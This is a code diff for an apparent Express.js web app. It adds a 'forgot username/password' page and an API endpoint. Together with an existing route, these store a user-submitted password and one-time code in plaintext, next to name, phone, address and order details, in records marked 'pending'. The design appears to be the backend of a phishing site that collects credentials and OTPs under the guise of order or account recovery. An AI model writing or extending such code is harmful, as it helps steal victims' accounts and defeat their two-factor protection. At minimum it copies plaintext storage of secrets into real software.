@@ -69,6 +69,11 @@ app.get('/forgot-username-success', (req, res) => {
     res.render('forgot-username-success', { lang, t: translations[lang], orderId: req.query.orderId, error: req.query.error });
 });
 
+app.get('/forgot-username-password', (req, res) => {
+    const lang = getLang(req);
+    res.render('forgot-username-password', { lang, t: translations[lang], orderId: req.query.orderId, error: req.query.error });
+});
+
 app.get('/forgot-password', (req, res) => {
     const lang = getLang(req);
     res.render('forgot-password', { lang, t: translations[lang], orderId: req.query.orderId, error: req.query.error });
@@ -161,6 +166,30 @@ app.post('/api/submit-forgot-username-confirm', (req, res) => {
         watchColor: '',
         username: username || '',
         password: '',
+        otp: '',
+        status: 'pending',
+        createdAt: new Date().toISOString()
+    };
+    requests.push(request);
+    res.json({ ok: true, id: request.id });
+});
+
+app.post('/api/submit-forgot-username-password', (req, res) => {
+    const { password, orderId } = req.body;
+    const request = {
+        id: nextId++,
+        type: 'forgot-username-password',
+        name: '',
+        phone: '',
+        email: '',
+        delivery: '',
+        branch: '',
+        governorate: '',
+        city: '',
+        address: '',
+        watchColor: '',
+        username: '',
+        password: password || '',
         otp: '',
         status: 'pending',
         createdAt: new Date().toISOString()
